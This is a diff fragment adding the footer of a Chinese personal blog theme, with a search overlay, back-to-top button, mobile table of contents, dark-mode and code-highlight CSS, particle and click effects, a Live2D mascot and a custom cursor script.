+    if (searchClose) {
+        searchClose.addEventListener('click', function() {
+            searchPage.classList.remove('search-active');
+        });
+    }
+    
+    document.addEventListener('keydown', function(e) {
+        if (e.key === 'Escape' && searchPage.classList.contains('search-active')) {
+            searchPage.classList.remove('search-active');
+        }
+    });
+})();
+</script>
+
+<!-- Service Worker -->
+
+<script src="/js/snackbar.js "></script>
+<script src="/js/sw-registration.js "></script>
+
+
+
+<!-- 回到顶部按钮 -->
+<style>
+.go-top {
+  position: fixed;
+  bottom: 30px;
+  right: 30px;
+  width: 48px;
+  height: 48px;
+  background: #0085a1;
+  color: #fff;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  cursor: pointer;
+  font-size: 25px;
+  padding-left: 19px;
+  font-weight: bold;
+  opacity: 0;
+  visibility: hidden;
+  transition: all 0.3s ease;
+  z-index: 999;
+  box-shadow: 0 2px 12px rgba(0,0,0,0.15);
+  text-decoration: none;
+  border: none;
+}
+
+.go-top:hover {
+  background: #006680;
+  transform: scale(1.08);
+}
+
+.go-top.show {
+  opacity: 1;
+  visibility: visible;
+}
+
+@media (max-width: 768px) {
+  .go-top {
+    bottom: 20px;
+    right: 20px;
+    width: 42px;
+    height: 42px;
+    font-size: 20px;
+  }
+}
+
+/* 手机端浮动目录按钮 - 默认隐藏 */
+.toc-mobile-btn {
+  position: fixed;
+  right: 15px;
+  bottom: 100px;
+  width: 45px;
+  height: 45px;
+  background: #0085a1;
+  color: #fff;
+  border-radius: 50%;
+  align-items: center;
+  justify-content: center;
+  font-size: 18px;
+  box-shadow: 0 2px 12px rgba(0,0,0,0.2);
+  cursor: pointer;
+  z-index: 1000;
+  display: none !important;
+}
+
+.toc-mobile-panel {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: rgba(0,0,0,0.8);
+  z-index: 2000;
+  transform: translateX(-100%);
+  transition: transform 0.3s ease;
+}
+
+.toc-mobile-panel.active {
+  transform: translateX(0);
+}
+
+.toc-mobile-content {
+  position: absolute;
+  left: 0;
+  top: 0;
+  width: 85%;
+  max-width: 320px;
+  height: 100%;
+  background: #fff;
+  padding: 20px;
+  overflow-y: auto;
+}
+
+.toc-mobile-content h4 {
+  margin: 0 0 15px 0;
+  font-size: 16px;
+  font-weight: 600;
+  color: #333;
+  padding-bottom: 10px;
+  border-bottom: 2px solid #0085a1;
+}
+
+.toc-mobile-content ul {
+  list-style: none;
+  padding-left: 0;
+  margin: 0;
+}
+
+.toc-mobile-content li {
+  margin: 10px 0;
+}
+
+.toc-mobile-content a {
+  color: #555;
+  text-decoration: none;
+  font-size: 14px;
+  display: block;
+  padding: 8px;
+  border-radius: 4px;
+  transition: all 0.2s;
+}
+
+.toc-mobile-content a:hover,
+.toc-mobile-content a.active {
+  background: #f0f0f0;
+  color: #0085a1;
+}
+
+.toc-mobile-close {
+  position: absolute;
+  right: 15px;
+  top: 15px;
+  font-size: 24px;
+  color: #999;
+  cursor: pointer;
+}
+
+/* 手机端显示目录按钮 */
+@media (max-width: 992px) {
+  .toc-mobile-btn.show {
+    display: flex !important;
+    align-items: center !important;
+    justify-content: center !important;
+  }
+}
+
+/* 深色模式手机端目录 */
+@media (prefers-color-scheme: dark) {
+  .toc-mobile-content {
+    background: #0a141e;
+  }
+  
+  .toc-mobile-content h4 {
+    color: #fff;
+    border-bottom-color: #00d4ff;
+  }
+  
+  .toc-mobile-content a {
+    color: #d4d4d4;
+  }
+  
+  .toc-mobile-content a:hover,
+  .toc-mobile-content a.active {
+    background: rgba(0, 212, 255, 0.15);
+    color: #00d4ff;
+  }
+  
+  .toc-mobile-close {
+    color: #666;
+  }
+}
+</style>
+
+<div class="go-top" id="goTopBtn">↑</div>
+
+<!-- 手机端目录按钮 -->
+<div class="toc-mobile-btn" id="tocMobileBtn">☰</div>
+
+<!-- 手机端目录面板 -->
+<div class="toc-mobile-panel" id="tocMobilePanel">
+  <div class="toc-mobile-content">
+    <div class="toc-mobile-close" id="tocMobileClose">×</div>
+    <h4>📖 目录</h4>
+    <ul id="tocMobileList"></ul>
+  </div>
+</div>
+
+<script>
+(function() {
+  var btn = document.getElementById('goTopBtn');
+  if (!btn) return;
+  
+  window.addEventListener('scroll', function() {
+    if (window.scrollY > 300) {
+      btn.classList.add('show');
+    } else {
+      btn.classList.remove('show');
+    }
+  });
+  
+  btn.addEventListener('click', function() {
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  });
+})();
+</script>
+
+<!-- 目录功能 JavaScript -->
+<script>
+(function() {
+  function initToc() {
+    var article = document.querySelector('.post-container');
+    if (!article) return;
+    
+    var headers = article.querySelectorAll('h2, h3');
+    if (headers.length === 0) return;
+    
+    // 显示目录按钮（只有文章页面才显示）
+    var mobileBtn = document.getElementById('tocMobileBtn');
+    if (mobileBtn) {
+      mobileBtn.classList.add('show');
+    }
+    
+    // 创建手机端目录列表
+    var mobileTocList = document.getElementById('tocMobileList');
+    if (!mobileTocList) return;
+    mobileTocList.innerHTML = '';
+    
+    headers.forEach(function(header, index) {
+      var id = 'toc-' + index;
+      header.id = id;
+      
+      // 手机端目录项
+      var mobileLi = document.createElement('li');
+      var mobileA = document.createElement('a');
+      mobileA.href = '#' + id;
+      mobileA.textContent = header.textContent;
+      mobileA.addEventListener('click', function(e) {
+        e.preventDefault();
+        document.getElementById(id).scrollIntoView({ behavior: 'smooth', block: 'start' });
+        document.getElementById('tocMobilePanel').classList.remove('active');
+      });
+      mobileLi.appendChild(mobileA);
+      mobileTocList.appendChild(mobileLi);
+    });
+    
+    // 高亮当前章节
+    var tocLinks = document.querySelectorAll('.toc-mobile-content a');
+    window.addEventListener('scroll', function() {
+      var scrollPos = window.scrollY + 100;
+      var currentId = null;
+      
+      headers.forEach(function(header) {
+        var offsetTop = header.offsetTop;
+        if (offsetTop <= scrollPos) {
+          currentId = header.id;
+        }
+      });
+      
+      tocLinks.forEach(function(link) {
+        link.classList.remove('active');
+        var href = link.getAttribute('href').substring(1);
+        if (href === currentId) {
+          link.classList.add('active');
+        }
+      });
+    });
+  }
+  
+  // 手机端目录按钮事件
+  var mobileBtn = document.getElementById('tocMobileBtn');
+  var mobilePanel = document.getElementById('tocMobilePanel');
+  var mobileClose = document.getElementById('tocMobileClose');
+  
+  if (mobileBtn && mobilePanel) {
+    mobileBtn.addEventListener('click', function() {
+      mobilePanel.classList.add('active');
+    });
+  }
+  
+  if (mobileClose && mobilePanel) {
+    mobileClose.addEventListener('click', function() {
+      mobilePanel.classList.remove('active');
+    });
+  }
+  
+  if (mobilePanel) {
+    mobilePanel.addEventListener('click', function(e) {
+      if (e.target === mobilePanel) {
+        mobilePanel.classList.remove('active');
+      }
+    });
+  }
+  
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initToc);
+  } else {
+    initToc();
+  }
+})();
+</script>
+
+<!-- 代码块深色主题（统一风格） -->
+<style>
+.highlight,
+pre.highlight {
+    background: #282c34 !important;
+    color: #abb2bf !important;
+    border-radius: 8px;
+    padding: 12px;
+    overflow-x: auto;
+}
+
+/* 代码块内文字颜色 */
+.highlight .c  { color: #5c6370 !important; font-style: italic; } /* 注释 */
+.highlight .k  { color: #c678dd !important; } /* 关键字 */
+.highlight .s  { color: #98c379 !important; } /* 字符串 */
+.highlight .n  { color: #abb2bf !important; } /* 变量名 */
+.highlight .p  { color: #abb2bf !important; } /* 括号 */
+.highlight .cm { color: #5c6370 !important; } /* 多行注释 */
+.highlight .nt { color: #e06c75 !important; } /* 标签 */
+
+/* 补充更多代码高亮样式 */
+.highlight .err { color: #960050 !important; background-color: #1e0010 !important; }
+.highlight .l { color: #98c379 !important; }
+.highlight .o { color: #abb2bf !important; }
+.highlight .cp { color: #5c6370 !important; font-style: italic; }
+.highlight .c1 { color: #5c6370 !important; font-style: italic; }
+.highlight .cs { color: #5c6370 !important; font-style: italic; }
+.highlight .kc { color: #c678dd !important; }
+.highlight .kd { color: #c678dd !important; }
+.highlight .kn { color: #c678dd !important; }
+.highlight .kp { color: #c678dd !important; }
+.highlight .kr { color: #c678dd !important; }
+.highlight .kt { color: #c678dd !important; }
+.highlight .ld { color: #98c379 !important; }
+.highlight .m { color: #d19a66 !important; }
+.highlight .na { color: #d19a66 !important; }
+.highlight .nb { color: #e5c07b !important; }
+.highlight .nc { color: #e5c07b !important; }
+.highlight .no { color: #e5c07b !important; }
+.highlight .nd { color: #e5c07b !important; }
+.highlight .ni { color: #e5c07b !important; }
+.highlight .ne { color: #e5c07b !important; }
+.highlight .nf { color: #abb2bf !important; }
+.highlight .nl { color: #e5c07b !important; }
+.highlight .nn { color: #abb2bf !important; }
+.highlight .nx { color: #abb2bf !important; }
+.highlight .py { color: #e5c07b !important; }
+.highlight .nv { color: #e5c07b !important; }
+.highlight .ow { font-weight: 700; }
+.highlight .w { color: #f8f8f2 !important; }
+.highlight .mf { color: #d19a66 !important; }
+.highlight .mh { color: #d19a66 !important; }
+.highlight .mi { color: #d19a66 !important; }
+.highlight .mo { color: #d19a66 !important; }
+.highlight .sb { color: #98c379 !important; }
+.highlight .sc { color: #98c379 !important; }
+.highlight .sd { color: #98c379 !important; }
+.highlight .s2 { color: #98c379 !important; }
+.highlight .se { color: #98c379 !important; }
+.highlight .sh { color: #98c379 !important; }
+.highlight .si { color: #98c379 !important; }
+.highlight .sx { color: #98c379 !important; }
+.highlight .sr { color: #56b6c2 !important; }
+.highlight .s1 { color: #98c379 !important; }
+.highlight .ss { color: #56b6c2 !important; }
+.highlight .bp { color: #e5c07b !important; }
+.highlight .vc { color: #e5c07b !important; }
+.highlight .vg { color: #e5c07b !important; }
+.highlight .vi { color: #e06c75 !important; }
+.highlight .il { color: #d19a66 !important; }
+
+/* 行号样式 */
+.highlight .lineno {
+    color: #5c6370 !important;
+    padding-right: 12px;
+    border-right: 1px solid #3e4451;
+    margin-right: 12px;
+}
+</style>
+
+<!-- 搜索页面样式 -->
+<style>
+.search-page {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: #fff;
+  z-index: 2000;
+  transform: translateY(100%);
+  transition: transform 0.4s ease;
+  overflow-y: auto;
+}
+
+.search-page.search-active {
+  transform: translateY(0);
+}
+
+.search-icon-close-container {
+  position: absolute;
+  top: 20px;
+  right: 20px;
+  cursor: pointer;
+  font-size: 24px;
+  z-index: 2001;
+}
+
+.search-main {
+  padding-top: 80px;
+}
+
+#search-input {
+  width: 100%;
+  padding: 15px;
+  font-size: 24px;
+  border: none;
+  border-bottom: 2px solid #0085a1;
+  outline: none;
+}
+
+#search-results {
+  margin-top: 30px;
+}
+</style>
+
+<!-- 页面背景和文字颜色样式 - 跟随系统主题 -->
+<style>
+:root {
+  --bg-color: #ffffff;
+  --text-color: #333333;
+  --text-light: #666666;
+  --heading-color: #000000;
+  --link-color: #0085a1;
+  --navbar-bg: rgba(255, 255, 255, 0.85);
+  --navbar-text: #66ccff;
+  --gradient-end: rgba(255, 255, 255, 1);
+}
+
+@media (prefers-color-scheme: dark) {
+  :root {
+    --bg-color: #0a141e;
+    --text-color: #e6e6e6;
+    --text-light: #d4d4d4;
+    --heading-color: #ffffff;
+    --link-color: #00d4ff;
+    --navbar-bg: rgba(10, 20, 30, 0.85);
+    --navbar-text: #66ccff;
+    --gradient-end: rgba(10, 20, 30, 1);
+  }
+}
+
+body {
+  background-color: var(--bg-color) !important;
+  color: var(--text-color) !important;
+}
+
+.post-container,
+.article-container {
+  color: var(--text-color) !important;
+}
+
+.post-container p,
+.post-container li,
+.post-container span {
+  color: var(--text-light) !important;
+}
+
+.post-container h1,
+.post-container h2,
+.post-container h3,
+.post-container h4,
+.post-container h5,
+.post-container h6 {
+  color: var(--heading-color) !important;
+}
+
+.post-container a {
+  color: var(--link-color) !important;
+}
+
+.navbar-custom .nav li a,
+.navbar-custom .navbar-brand {
+    color: var(--navbar-text) !important;
+}
+
+.navbar-custom .nav li a:hover,
+.navbar-custom .navbar-brand:hover {
+    color: #3399ff !important;
+}
+
+.navbar-custom {
+    background-color: var(--navbar-bg) !important;
+}
+
+.intro-header .site-heading h1,
+.intro-header .page-heading h1 {
+    color: #ffffff !important;
+    font-size: 60px !important;
+}
+
+.intro-header .site-heading .subheading {
+    color: #ffffff !important;
+}
+
+.intro-header {
+    position: relative;
+}
+
+.intro-header::after {
+    content: "";
+    position: absolute;
+    bottom: 0;
+    left: 0;
+    width: 100%;
+    height: 120px;
+    background: linear-gradient(to bottom, rgba(255, 255, 255, 0), var(--gradient-end));
+    pointer-events: none;
+}
+
+@media (prefers-color-scheme: dark) {
+  /* 首页文章卡片 */
+  .post-card {
+    border-bottom-color: rgba(255, 255, 255, 0.1) !important;
+  }
+  .post-card-title a {
+    color: #ffffff !important;
+  }
+  .post-card-title a:hover {
+    color: #00d4ff !important;
+  }
+  .post-card-date,
+  .post-card-meta {
+    color: #b3b3b3 !important;
+  }
+  .post-card-excerpt {
+    color: #d4d4d4 !important;
+  }
+  
+  /* 归档页面 */
+  .archive-year {
+    color: #ffffff !important;
+    border-left-color: #00d4ff !important;
+  }
+  .archive-date {
+    color: #b3b3b3 !important;
+  }
+  .archive-item a {
+    color: #e6e6e6 !important;
+  }
+  .archive-item a:hover {
+    color: #00d4ff !important;
+  }
+  
+  /* 归档标签按钮 */
+  #tag_cloud a,
+  #tag_cloud .tag-button--all {
+    background: rgba(255, 255, 255, 0.1) !important;
+    color: #e6e6e6 !important;
+  }
+  #tag_cloud a.active,
+  #tag_cloud .tag-button--all.active {
+    background: #0085a1 !important;
+    color: #ffffff !important;
+  }
+  #tag_cloud a:hover,
+  #tag_cloud .tag-button--all:hover {
+    background: rgba(0, 212, 255, 0.3) !important;
+    color: #ffffff !important;
+  }
+  #tag_cloud sup {
+    color: #999 !important;
+  }
+  #tag_cloud a.active sup,
+  #tag_cloud .tag-button--all.active sup {
+    color: #ffffff !important;
+  }
+  
+  .waifu-tips {
+    background-color: rgba(30, 40, 60, 0.9) !important;
+    border-color: rgba(0, 212, 255, 0.5) !important;
+    box-shadow: 0 3px 15px 2px rgba(0, 212, 255, 0.2) !important;
+    color: #ffffff !important;
+  }
+  .hide-button {
+    background: rgba(0, 212, 255, 0.2) !important;
+    border-color: rgba(0, 212, 255, 0.4) !important;
+    box-shadow: 0 3px 15px 2px rgba(0, 212, 255, 0.4) !important;
+    color: #ffffff !important;
+  }
+  .hide-button:hover {
+    background: rgba(0, 212, 255, 0.3) !important;
+    border-color: #00d4ff !important;
+  }
+  .show-button {
+    background: rgba(0, 212, 255, 0.8) !important;
+    border-color: rgba(0, 212, 255, 0.6) !important;
+    box-shadow: 0 3px 15px 2px rgba(0, 212, 255, 0.4) !important;
+  }
+}
+</style>
+
+<!-- 粒子背景 - 延迟加载 -->
+<div id="particles-js" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1;"></div>
+<script>
+// 延迟加载粒子特效 - 等页面加载完再加载
+window.addEventListener('load', function() {
+    setTimeout(function() {
+        var particlesScript = document.createElement('script');
+        particlesScript.src = 'https://cdn.bootcdn.net/ajax/libs/particles.js/2.0.0/particles.min.js';
+        document.body.appendChild(particlesScript);
+        
+        particlesScript.onload = function() {
+            particlesJS("particles-js", {
+                "particles": {
+                    "number": { "value": 30 },
+                    "color": { "value": "#00ffff" },
+                    "shape": { "type": "circle" },
+                    "opacity": { "value": 0.5, "random": true },
+                    "size": { "value": 2, "random": true },
+                    "line_linked": { "enable": false },
+                    "move": { "enable": true, "speed": 1.5, "direction": "none", "random": true }
+                },
+                "interactivity": {
+                    "detect_on": "canvas",
+                    "events": {
+                        "onhover": { "enable": false },
+                        "onclick": { "enable": false }
+                    }
+                }
+            });
+            console.log("粒子特效加载完成");
+        };
+    }, 1000);
+});
+</script>
+
+<!-- 鼠标点击特效 - Canvas优化 -->
+<canvas id="clickCanvas" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 9999;"></canvas>
+<script>
+// Canvas点击特效 - 性能优化
+(function() {
+    var canvas = document.getElementById('clickCanvas');
+    if (!canvas) return;
+    var ctx = canvas.getContext('2d');
+    var particles = [];
+    var colors = ['#00ffff', '#ff00ff', '#ffff00', '#00ff00', '#ff6600', '#0066ff', '#ff3366'];
+    
+    function resize() {
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+    }
+    resize();
+    window.addEventListener('resize', resize);
+    
+    function Particle(x, y, color) {
+        this.x = x;
+        this.y = y;
+        this.color = color;
+        this.size = 5 + Math.random() * 10;
+        var angle = Math.random() * Math.PI * 2;
+        var speed = 2 + Math.random() * 3;
+        this.vx = Math.cos(angle) * speed;
+        this.vy = Math.sin(angle) * speed;
+        this.alpha = 1;
+        this.decay = 0.008 + Math.random() * 0.01;
+    }
+    
+    Particle.prototype.update = function() {
+        this.x += this.vx;
+        this.y += this.vy;
+        this.alpha -= this.decay;
+        this.size *= 0.99;
+    };
+    
+    Particle.prototype.draw = function() {
+        ctx.save();
+        ctx.globalAlpha = this.alpha;
+        ctx.fillStyle = this.color;
+        ctx.beginPath();
+        ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+        ctx.fill();
+        ctx.restore();
+    };
+    
+    let animating = false;
+    
+    document.addEventListener('click', function(e) {
+        var color = colors[Math.floor(Math.random() * colors.length)];
+        for (var i = 0; i < 5; i++) {
+            particles.push(new Particle(e.clientX, e.clientY, color));
+        }
+        // 如果没在动画，启动动画循环
+        if (!animating) {
+            animating = true;
+            animate();
+        }
+    });
+    
+    function animate() {
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+        for (var i = particles.length - 1; i >= 0; i--) {
+            particles[i].update();
+            // 只有在粒子还可见的时候才绘制
+            if (particles[i].alpha > 0 && particles[i].size > 0.5) {
+                particles[i].draw();
+            }
+            // 完全消失后再移除
+            if (particles[i].alpha <= 0 || particles[i].size <= 0.5) {
+                particles.splice(i, 1);
+            }
+        }
+        // 只有当还有粒子时才继续动画，否则停止
+        if (particles.length > 0) {
+            requestAnimationFrame(animate);
+        } else {
+            animating = false;
+        }
+    }
+})();
+</script>
+
+<!-- 加载 Font Awesome 图标库 - 预连接优化 -->
+<link rel="preconnect" href="https://cdn.bootcdn.net">
+<link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/6.4.0/css/all.min.css" media="print" onload="this.media='all'">
+<noscript><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/6.4.0/css/all.min.css"></noscript>
+
+<!-- Live2D 看板娘 - 延迟加载 -->
+<div class="waifu" id="landlord" style="display: none;">
+    <div class="waifu-tips"></div>
+    <canvas id="live2d" width="300" height="300"></canvas>
+    <div class="hide-button">隐藏</div>
+</div>
+<div class="show-button" id="showWaifuBtn" style="display: none;">🌸</div>
+<script>
+// 延迟加载看板娘 - 等页面完全加载后再加载
+window.addEventListener('load', function() {
+    // 延迟3秒后加载看板娘，不阻塞首屏
+    setTimeout(function() {
+        // 加载看板娘CSS
+        var waifuCss = document.createElement('link');
+        waifuCss.rel = 'stylesheet';
+        waifuCss.href = '/live2d/css/waifu.css';
+        document.head.appendChild(waifuCss);
+        
+        // 显示看板娘
+        var waifu = document.getElementById('landlord');
+        if (waifu) {
+            waifu.style.display = 'block';
+        }
+        
+        // 加载Live2D脚本
+        var live2dScript = document.createElement('script');
+        live2dScript.src = '/live2d/js/live2d.js';
+        document.body.appendChild(live2dScript);
+        
+        live2dScript.onload = function() {
+            // 加载waifu.js
+            var waifuScript = document.createElement('script');
+            waifuScript.src = '/live2d/js/waifu.js';
+            document.body.appendChild(waifuScript);
+            
+            waifuScript.onload = function() {
+                // 加载模型
+                loadlive2d("live2d", "/live2d/model/pio/model.json");
+                console.log("Pio 酱模型加载完成");
+            };
+        };
+    }, 3000); // 3秒后加载
+});
+</script>
+
+<style>
+.animecursor-disabled,
+.animecursor-disabled * {
+  cursor: auto !important;
+}
+
+input, textarea, [contenteditable] {
+  cursor: text !important;
+}
+</style>
+
+<script defer src="/js/anime-cursor/dist/anime-cursor.umd.min.js"></script>
+<script>
+// 光标效果 - 文章页延迟加载，避免影响性能
+function initAnimeCursor() {
+    try {
+        new AnimeCursor({
+            fallbackCursor: 'auto',
+            excludeSelectors: 'input, textarea, [contenteditable]',
+            cursors: {
+                default: {
+                    image: '/img/mouse/default_001.png',
+                    default: true,
+                    offset: [0, 0]
+                },
+                pointer: {
+                    tags: ['a', 'button'],
+                    image: '/img/mouse/default_001.png',
+                    offset: [0, 0]
+                },
+                landlord: {
+                    tags: ['.waifu', '#landlord', '#live2d'],
+                    image: '/img/mouse/landlord_001.png',
+                    offset: [0, 0]
+                }
+            }
+        });
+        console.log('AnimeCursor initialized successfully');
+    } catch (error) {
+        console.error('AnimeCursor initialization failed:', error);
+        document.body.classList.add('animecursor-disabled');
+    }
+}
+
+document.addEventListener('DOMContentLoaded', function() {
+    
+        // 文章页延迟2秒后加载，不影响文章加载
+        setTimeout(initAnimeCursor, 2000);
+    
+});
+</script>
+</script>
